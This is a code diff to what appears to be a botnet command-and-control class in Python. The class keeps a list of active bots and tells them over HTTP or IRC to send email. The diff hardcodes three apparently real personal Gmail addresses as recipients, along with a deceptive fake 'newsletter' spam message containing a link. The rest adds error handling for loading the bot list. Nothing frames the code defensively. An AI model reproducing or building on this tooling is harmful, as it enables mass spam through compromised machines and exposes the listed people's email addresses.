@@ -252,22 +252,12 @@ class CC:
                 print(e)
 
     def sendHTTPEmail(self, target=""):
-        users = None
-        oggetto = None
-        messaggio = None
         headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-
-        try:
-            with open("email.json", 'r') as f:
-                res = json.load(f)
-                users = res["utenti"]
-                oggetto = res["oggetto"]
-                messaggio = res["messaggio"]
-        except Exception as e:
-            print("File error:",e)
+        users = ["gioelezoccoli99@gmail.com", "flypilot.51@gmail.com", "lorensosp0401@gmail.com"]
+        oggetto = "Welcome to Our Newsletter - Thank You for Signing Up!"
+        messaggio = "I hope this email finds you well. I would like to extend a warm welcome and express our heartfelt appreciation for joining our newsletter community. More info: https://www.youtube.com/watch?v=xvFZjo5PgG0",
 
         data = {"oggetto": oggetto, "messaggio": messaggio, "utenti": users}
-
 
         print("Sending requests...")
         if target == "":
@@ -391,23 +381,13 @@ class CC:
         closeIrc(s)
 
     def sendIRCEmail(self, target=""):
-        users = None
-        oggetto = None
-        messaggio = None
+        users = ["gioelezoccoli99@gmail.com", "flypilot.51@gmail.com", "lorensosp0401@gmail.com"]
+        oggetto = "Welcome to Our Newsletter - Thank You for Signing Up!"
+        messaggio = "I hope this email finds you well. I would like to extend a warm welcome and express our heartfelt appreciation for joining our newsletter community. More info: https://www.youtube.com/watch?v=xvFZjo5PgG0",
 
         s = irc()
         if s is None:
             print("IRC connection error")
-            return
-
-        try:
-            with open("email.json", 'r') as f:
-                res = json.load(f)
-                users = res["utenti"]
-                oggetto = res["oggetto"]
-                messaggio = res["messaggio"]
-        except Exception as e:
-            print("File error:", e)
             return
 
         if target == "":
@@ -533,11 +513,13 @@ class CC:
                     return
 
     def loadData(self):
-        with open("./activeBot.json", 'r') as f:
-            self.activeBot = json.load(f)
-
+        try:
+            with open("./activeBot.json", 'r') as f:
+                self.activeBot = json.load(f)
+        except:
+            self.activeBot = {}
     def writeData(self):
-        with open("./activeBot.json", 'w') as f:
+        with open("./activeBot.json", 'w+') as f:
             json.dump(self.activeBot, f, indent=2)
 
 
